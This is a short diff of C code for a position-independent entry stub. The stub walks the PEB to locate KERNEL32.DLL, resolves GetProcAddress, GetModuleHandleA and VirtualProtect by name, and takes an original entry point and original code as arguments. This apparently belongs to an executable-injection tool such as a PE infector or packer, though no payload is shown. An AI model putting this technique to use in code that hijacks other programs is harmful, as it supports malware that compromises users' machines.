@@ -5,7 +5,7 @@ typedef unsigned short      WORD;
 DWORD getFuncAddress(char *funcName , DWORD k32Address);
 DWORD findDll(DWORD pebAddr, char *name);
 
-DWORD entry(DWORD pebAddr ,DWORD baseAddress,DWORD offset ,DWORD originEntry,char * originCode){
+DWORD entry(DWORD pebAddr ,DWORD offset ,DWORD originEntry,char * originCode){
 
 	DWORD k32Address = 0 ;
 	char kernelStr[]="KERNEL32.DLL";
@@ -34,6 +34,14 @@ DWORD entry(DWORD pebAddr ,DWORD baseAddress,DWORD offset ,DWORD originEntry,cha
 
 	typedef WINBASEAPI FARPROC (WINAPI *GetProcAddress)(_In_ HMODULE hModule,_In_ LPCSTR lpProcName);
 	GetProcAddress getProcAddress = (GetProcAddress)(gpAddr);
+
+    // get the programmer base address
+	DWORD baseAddress;
+	char getModuleStr[]="GetModuleHandleA";
+	DWORD mhAddr  = getProcAddress(k32Address,getModuleStr);
+    typedef DWORD (*GetModuleHandleA)( LPCWSTR lpModuleName);
+    GetModuleHandleA getModuleHandleA = (GetModuleHandleA)(mhAddr);
+    baseAddress= getModuleHandleA(NULL);
 
 	typedef BOOL (WINAPI *VirtualProtect)(_In_  DWORD lpAddress,_In_  DWORD dwSize,_In_  DWORD flNewProtect,_Out_ DWORD lpflOldProtect);
 	char virtualProtectStr[] = "VirtualProtect";
